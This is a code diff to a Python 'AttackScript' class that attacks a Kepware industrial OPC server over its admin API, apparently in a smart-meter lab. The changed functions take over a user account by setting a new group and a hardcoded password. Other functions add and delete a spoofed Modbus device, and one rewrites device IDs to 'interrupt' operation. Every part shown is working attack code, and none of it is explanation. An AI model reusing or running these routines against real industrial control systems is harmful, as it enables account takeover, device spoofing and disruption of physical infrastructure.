@@ -1117,9 +1117,9 @@ class AttackScript:
         server = self.kep_connect()
         print(json.dumps(admin.users.get_user(server, user),indent=4),file=sys.stdout)
 
-    def kep_modify_user(self,user): ## ADDED to modify user requires three input from user - Description and Usergroup name and user to change
+    def kep_modify_user(self,user): ## ADDED to modify user requires three input from user - Description and Usergroup name and user to change and password
         server = self.kep_connect()
-        print(json.dumps(admin.users.modify_user(server, {"common.ALLTYPES_DESCRIPTION": "TEST UPDATE", "libadminsettings.USERMANAGER_USER_GROUPNAME": "readtesting"}, "bigboi" ), indent=4))
+        print(json.dumps(admin.users.modify_user(server, {"common.ALLTYPES_DESCRIPTION": "TEST UPDATE", "libadminsettings.USERMANAGER_USER_GROUPNAME": "Illuminati", "libadminsettings.USERMANAGER_USER_PASSWORD": "icanfreeload69"}, user="bigboi"), indent=4))
         print(admin.users.get_user(server, "bigboi"))
 
     def kep_add_user(self,user): ## GIVE USER NOTE THAT PASSWORD NEEDS TO BE 14 characters or more
@@ -1202,12 +1202,29 @@ class AttackScript:
         device_to_get = ".".join([channel, device])
         print(json.dumps(connectivity.device.get_device(server, device_to_get), indent=4))
 
-    def kep_modify_device(self, channel, device):
+    ## SPOOFED DEVICE
+  
+    def kep_add_spoofed_device(self,channel,device):
         server = self.kep_connect()
         device_to_get = ".".join([channel, device])
-        print(json.dumps(connectivity.device.get_device(server, "SmartMeter.Hijack", {"PROJECT_ID": 1459547795, "common.ALLTYPES_NAME": "ministicHACKED"}), indent=4))
-        
+        print("ADD DEVICE: " + json.dumps(connectivity.device.add_device(server, channel, {"common.ALLTYPES_NAME": device, "servermain.MULTIPLE_TYPES_DEVICE_DRIVER": "Modbus RTU Serial", "servermain.DEVICE_SCAN_MODE_RATE_MS": 8888888}), indent=4))
+        print("\n" + json.dumps(connectivity.device.get_device(server, device_to_get), indent=4))
 
+    def kep_delete_spoofed_device(self,channel, device):
+        server = self.kep_connect()
+        device_to_del = ".".join([channel, device])
+        print("DELETE DEVICE: " + json.dumps(connectivity.device.del_device(server, device_to_del), indent=4))
+
+    def kep_modify_device(self, channel, device): ### ADDED to change device ID to interrupt 
+        server = self.kep_connect()
+        device_to_get = ".".join([channel, device])
+        print(json.dumps(connectivity.device.modify_device(server, device_to_get, {"PROJECT_ID": 503807999, 
+                                                                                        "common.ALLTYPES_NAME": "Device69",
+                                                                                        "servermain.DEVICE_ID_STRING": "69",
+                                                                                        "servermain.DEVICE_ID_HEXADECIMAL": 69,
+                                                                                        "servermain.DEVICE_ID_DECIMAL": 69,
+                                                                                        "servermain.DEVICE_ID_OCTAL": 69}), indent=4))
+    
     ## TAG FOR DEVICE
 
     def kep_get_full_tag_structure(self,channel, device): ## ADDED to get full tag structure
@@ -1236,19 +1253,6 @@ class AttackScript:
         device_to_get = ".".join([channel, device])
         print(json.dumps(connectivity.tag.modify_tag(server, "SmartMeter.ministicHACKED.TEST1", {"PROJECT_ID": 2330553848,  "common.ALLTYPES_NAME": "UPDATEBOI"}), indent=4))
         print(json.dumps(connectivity.tag.get_all_tags(server, device_to_get), indent=4))
-
-    ## SPOOFED DEVICE
-  
-    def kep_add_spoofed_device(self,channel,device):
-        server = self.kep_connect()
-        device_to_get = ".".join([channel, device])
-        print("ADD DEVICE: " + json.dumps(connectivity.device.add_device(server, channel, {"common.ALLTYPES_NAME": device, "servermain.MULTIPLE_TYPES_DEVICE_DRIVER": "Modbus RTU Serial", "servermain.DEVICE_SCAN_MODE_RATE_MS": 8888888}), indent=4))
-        print("\n" + json.dumps(connectivity.device.get_device(server, device_to_get), indent=4))
-
-    def kep_delete_spoofed_device(self,channel, device):
-        server = self.kep_connect()
-        device_to_del = ".".join([channel, device])
-        print("DELETE DEVICE: " + json.dumps(connectivity.device.del_device(server, device_to_del), indent=4))
 
     def disable_running_schedules(self) -> None:
         """
